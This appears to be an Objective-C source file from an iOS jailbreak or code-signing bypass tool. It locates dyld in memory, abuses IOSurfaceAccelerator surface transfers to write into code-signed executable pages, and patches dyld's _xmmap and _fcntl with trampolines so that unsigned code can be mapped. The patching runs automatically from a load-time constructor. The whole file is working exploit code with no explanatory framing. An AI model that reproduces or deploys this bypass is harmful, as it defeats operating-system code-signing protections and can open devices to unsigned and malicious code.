
#import <Foundation/Foundation.h>
#import <sys/syscall.h>
#import <dlfcn.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>
#include <mach-o/fat.h>
#include <sys/mman.h>
#include <mach/mach.h>
#import <IOSurface/IOSurface.h>

kern_return_t IOSurfaceAcceleratorCreate(CFAllocatorRef allocator, int type, void **outAccelerator);
kern_return_t IOSurfaceAcceleratorTransferSurface(void* accelerator, IOSurfaceRef source, IOSurfaceRef dest, CFDictionaryRef, void *);

#ifdef __LP64__
#define mach_hdr struct mach_header_64
#define sgmt_cmd struct segment_command_64
#define sect_cmd struct section_64
#define nlist_ struct nlist_64
#define LC_SGMT LC_SEGMENT_64
#define MH_MAGIC_ MH_MAGIC_64
#else
#define mach_hdr struct mach_header
#define sgmt_cmd struct segment_command
#define sect_cmd struct section
#define nlist_ struct nlist
#define LC_SGMT LC_SEGMENT
#define MH_MAGIC_ MH_MAGIC
#endif
#define load_cmd struct load_command


sect_cmd *find_section(sgmt_cmd *seg, const char *name)
{
    sect_cmd *sect, *fs = NULL;
    uint32_t i = 0;
    for (i = 0, sect = (sect_cmd *)((uint64_t)seg + (uint64_t)sizeof(sgmt_cmd));
         i < seg->nsects;
         i++, sect = (sect_cmd*)((uint64_t)sect + sizeof(sect_cmd)))
    {
        if (!strcmp(sect->sectname, name)) {
            fs = sect;
            break;
        }
    }
    return fs;
}

struct load_command *find_load_command(mach_hdr *mh, uint32_t cmd)
{
    load_cmd *lc, *flc;
    lc = (load_cmd *)((uint64_t)mh + sizeof(mach_hdr));
    while ((uint64_t)lc < (uint64_t)mh + (uint64_t)mh->sizeofcmds) {
        if (lc->cmd == cmd) {
            flc = (load_cmd *)lc;
            break;
        }
        lc = (load_cmd *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    return flc;
}

sgmt_cmd *find_segment(mach_hdr *mh, const char *segname)
{
    load_cmd *lc;
    sgmt_cmd *s, *fs = NULL;
    lc = (load_cmd *)((uint64_t)mh + sizeof(mach_hdr));
    while ((uint64_t)lc < (uint64_t)mh + (uint64_t)mh->sizeofcmds) {
        if (lc->cmd == LC_SGMT) {
            s = (sgmt_cmd *)lc;
            if (!strcmp(s->segname, segname)) {
                fs = s;
                break;
            }
        }
        lc = (load_cmd *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    return fs;
}

void* find_sym(mach_hdr *mh, const char *name) {
    sgmt_cmd* first = (sgmt_cmd*) find_load_command(mh, LC_SGMT);
    sgmt_cmd* linkedit = find_segment(mh, SEG_LINKEDIT);
    struct symtab_command* symtab = (struct symtab_command*) find_load_command(mh, LC_SYMTAB);
    vm_address_t vmaddr_slide = (vm_address_t)mh - (vm_address_t)first->vmaddr;
    
    char* sym_str_table = (char*) linkedit->vmaddr - linkedit->fileoff + vmaddr_slide + symtab->stroff;
    nlist_* sym_table = (nlist_*)(linkedit->vmaddr - linkedit->fileoff + vmaddr_slide + symtab->symoff);
    
    for (int i = 0; i < symtab->nsyms; i++) {
        if (sym_table[i].n_value && !strcmp(name,&sym_str_table[sym_table[i].n_un.n_strx])) {
            return (void*) (uint64_t) (sym_table[i].n_value + vmaddr_slide);
        }
    }
    return 0;
}

vm_address_t find_dyld() {
    kern_return_t kr      = KERN_SUCCESS;
    vm_address_t  address = 0;
    vm_size_t     size    = 0;
    
    while (1) {
        mach_msg_type_number_t count;
        struct vm_region_submap_info_64 info;
        uint32_t nesting_depth;
        
        count = VM_REGION_SUBMAP_INFO_COUNT_64;
        kr = vm_region_recurse_64(mach_task_self(), &address, &size, &nesting_depth,
                                  (vm_region_info_64_t)&info, &count);
        if (kr == KERN_INVALID_ADDRESS) {
            break;
        } else if (kr) {
            mach_error("vm_region:", kr);
            break; /* last region done */
        }
        
        if (info.is_submap) {
            nesting_depth++;
        } else {
            if (info.protection & PROT_EXEC && info.protection & PROT_READ) {
                if (*(uint32_t*) (address) == MH_MAGIC_ ) {
                    mach_hdr* hd = (mach_hdr*) address;
                    if (hd->filetype == MH_DYLINKER) {
                        return address;
                    }
                }
            }
            address += size;
        }
    }
    return 0;
}

static int fcntlhook(int a, int b) {
    return -1;
}


void memcpy_bypassprot_page(void* addr, void* src) {
    static int fd = 0;
    static vm_offset_t protmap = 0;
    static         CFMutableDictionaryRef dict;
    static         void* accel = 0;
    
    if (!fd) {
        fd = open("/usr/lib/dyld", O_RDONLY);
        
        
        assert(fd!=-1);
        
        char dyld_header[0x4000];
        
        vm_offset_t off = 0;
        while (1) {
            pread(fd, dyld_header, 0x4000, off);
            
            if (*(uint32_t*)(dyld_header) == MH_MAGIC) {
                break;
            }
            
            off += 0x1000;
        }
        
        
        struct mach_header* hdr = dyld_header;
        struct load_command* lc = hdr + 1;
        for (int i = 0; i < hdr->ncmds; i++) {
            if (lc->cmd == LC_CODE_SIGNATURE) {
                struct linkedit_data_command* codeSigCmd = lc;
                fsignatures_t siginfo;
                siginfo.fs_file_start=off;				// start of mach-o slice in fat file
                siginfo.fs_blob_start=(void*)(long)(codeSigCmd->dataoff);	// start of CD in mach-o file
                siginfo.fs_blob_size=codeSigCmd->datasize;			// size of CD
                int result = fcntl(fd, F_ADDFILESIGS_RETURN, &siginfo);
                NSLog(@"Sigload %x", result);
                protmap = off;
                break;
            }
            lc = ((char*)lc) + lc->cmdsize;
        }
        
        assert(protmap);
        
        int width = PAGE_SIZE / (8*4);
        int height = 8;
        
        int pitch = width*4, size = width*height*4;
        int bPE=4;
        char pixelFormat[4] = {'A','R','G','B'};
        dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(dict, kIOSurfaceBytesPerRow, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &pitch));
        CFDictionarySetValue(dict, kIOSurfaceBytesPerElement, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &bPE));
        CFDictionarySetValue(dict, kIOSurfaceWidth, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &width));
        CFDictionarySetValue(dict, kIOSurfaceHeight, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &height));
        CFDictionarySetValue(dict, kIOSurfacePixelFormat, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, pixelFormat));
        CFDictionarySetValue(dict, kIOSurfaceAllocSize, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &size));
        assert(IOSurfaceAcceleratorCreate(kCFAllocatorDefault, 0, &accel) == KERN_SUCCESS);
        IOSurfaceAcceleratorTransferSurface(0,0,0,0,0);
        mprotect(0,0,0);
        mlock(0,0);
        mmap(0,0,0,0,0,0);
        IOSurfaceCreate(0);
        memcmp(0,0,0);

    }
    
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAddress"), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &src));
    IOSurfaceRef srcSurf = IOSurfaceCreate(dict);

    munmap(addr,PAGE_SIZE);
    mmap(addr, PAGE_SIZE, PROT_READ|PROT_EXEC, MAP_FIXED|MAP_FILE|MAP_PRIVATE, fd, protmap);
    mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAddress"), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &addr));
    IOSurfaceRef destSurf = IOSurfaceCreate(dict);
    mprotect(addr, PAGE_SIZE, PROT_READ|PROT_EXEC);
    mlock(addr, PAGE_SIZE);
    
    assert(destSurf && srcSurf);
    assert(IOSurfaceAcceleratorTransferSurface(accel, srcSurf, destSurf, 0, 0) == 0);

    CFRelease(destSurf);
    CFRelease(srcSurf);
}



static void *
mmaphook(void *addr, size_t len, int prot, int flags, int fd, off_t offset)
{
    if (!(prot & PROT_EXEC)) {
        return mmap(addr,len,prot,flags,fd,offset);
    }
    static char* buf = 0;
    if (!buf) {
        buf = mmap(0, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0);
    }
    off_t actoff = 0;
    
    while (actoff < len) {
        pread(fd, buf, PAGE_SIZE, offset+actoff);
        memcpy_bypassprot_page(addr + actoff, buf);
        actoff += PAGE_SIZE;
    }
    return addr;
}

__attribute__((constructor))
void ayy_lmao() {
    // Load PLT entries (munmap breaks dyld..)
    
    mmap(0, 0, 0, 0, 0, 0);
    mlock(0, 0);
    mprotect(0, 0, 0);
    
    char *buf = mmap(0, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0);

    
    mach_hdr* dyld_hdr = (mach_hdr*) find_dyld();
    assert(dyld_hdr);
    assert(dyld_hdr->filetype == MH_DYLINKER);
    // Copy original code

    vm_address_t fcntl = (vm_address_t) find_sym(dyld_hdr, "_fcntl");
    assert(fcntl);
    vm_address_t xmmap = (vm_address_t) find_sym(dyld_hdr, "_xmmap");
    assert(xmmap);
    
    memcpy(buf, (void*)(xmmap & (~PAGE_MASK)), PAGE_SIZE);
    
    // Patch.
    
    extern void _tramp_begin();
    extern void _tramp_end();
    char* xmb = &buf[xmmap & PAGE_MASK];
    memcpy(xmb, _tramp_begin, ((vm_address_t)_tramp_end)-((vm_address_t)_tramp_begin));
    
    vm_address_t* tramp_target = (vm_address_t*) &xmb[((vm_address_t)_tramp_end)-((vm_address_t)_tramp_begin)];
    tramp_target --;
    *tramp_target = (vm_address_t) mmaphook;

    // Replace code
    
    memcpy_bypassprot_page((void*)(xmmap & (~PAGE_MASK)), buf);
    
    // Copy original code
    
    memcpy(buf, (void*)(fcntl & (~PAGE_MASK)), PAGE_SIZE);
    
    // Patch.
    
    xmb = &buf[fcntl & PAGE_MASK];
    memcpy(xmb, _tramp_begin, ((vm_address_t)_tramp_end)-((vm_address_t)_tramp_begin));
    
    tramp_target = (vm_address_t*) &xmb[((vm_address_t)_tramp_end)-((vm_address_t)_tramp_begin)];
    tramp_target --;
    *tramp_target = (vm_address_t) fcntlhook;
    
    // Replace code
    
    memcpy_bypassprot_page((void*)(fcntl & (~PAGE_MASK)), buf);
}
